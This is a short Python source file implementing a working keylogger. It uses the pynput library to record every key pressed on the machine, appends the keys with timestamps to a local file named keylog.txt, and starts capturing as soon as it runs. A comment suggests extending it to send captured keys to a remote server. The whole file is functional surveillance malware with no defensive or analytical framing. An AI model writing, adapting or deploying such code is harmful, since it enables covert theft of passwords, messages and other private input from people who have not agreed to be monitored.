from pynput.keyboard import Listener, Key
import time

# Define the callback function to handle key press events
def on_press(key):
    # Modify this function to perform the desired action
    # For example, you can log the pressed key, store it in a variable, or send it to a remote server

    # Check if the pressed key is "Enter"
    if key == Key.enter:
        # Write a newline character to separate phrases
        with open("keylog.txt", "a") as f:
            f.write("\n")
    elif key == Key.space:
        # Write a space character to separate words
        with open("keylog.txt", "a") as f:
            f.write(" ")
    else:
        # Write the pressed key to the file without single quotes
        with open("keylog.txt", "a") as f:
            f.write(str(key).strip("'"))

# Define a function to log timestamps
def log_timestamp():
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("keylog.txt", "a") as f:
        f.write("\n[{}] ".format(timestamp))

# Define a function to start the keylogger
def start_keylogger():
    with open("keylog.txt", "a") as f:
        f.write("\n\n----- Keylogger Started -----\n\n")

    # Create the listener object and attach the callback function
    with Listener(on_press=on_press) as listener:
        try:
            # Log the timestamp when the keylogger starts
            log_timestamp()

            # Start the listener to begin capturing keyboard events
            listener.join()
        except KeyboardInterrupt:
            # Handle CTRL+C to terminate the program gracefully
            with open("keylog.txt", "a") as f:
                f.write("\n\n----- Keylogger Stopped -----\n")

# Call the function to start the keylogger
start_keylogger()
